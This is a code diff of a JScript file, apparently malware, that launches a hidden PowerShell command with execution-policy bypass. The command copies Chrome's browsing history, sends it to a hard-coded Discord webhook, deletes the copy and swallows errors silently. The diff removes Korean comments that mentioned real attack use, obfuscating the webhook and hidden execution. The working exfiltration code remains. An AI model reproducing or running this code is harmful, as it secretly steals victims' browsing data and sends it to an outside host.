@@ -12,11 +12,10 @@
     try {
         var shell = new ActiveXObject("WScript.Shell");
         
-        // Discord webhook (실제 공격 시 분할 저장하거나 난독화 추천)
+        // Discord webhook
         var webhook = "https://discord.com/api/webhooks/1472244980662927381/FycSobkkKh_MzI-EcY_cZYC7OGdo9U8yTKBReRTzkfeagFVW6hit4W7ODQ8MqwCL9iiv";
         
-        // PowerShell one-liner로 Chrome 히스토리 추출 & 전송
-        // 원본 ino의 로직을 그대로 압축 → 실행정책 우회 포함
+        // Chrome 히스토리 추출 & 전송
         var psCommand = 
             "$hook='" + webhook + "';" +
             "$src=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History\";" +
@@ -29,11 +28,8 @@
             "irm $hook -Method Post -Body @{content=$msg};" +
             "Remove-Item $dst -Force;";
 
-        // PowerShell 숨김 실행 (창 안 뜨게)
+        // PowerShell 실행
         shell.Run('powershell.exe -ep bypass -w hidden -c "' + psCommand + '"', 0, true);
-
-        // 테스트용 무해 확인 (주석 해제 시 calc 띄움)
-        // shell.Run("calc.exe", 1, false);
 
     } catch(e) {
         // silent fail
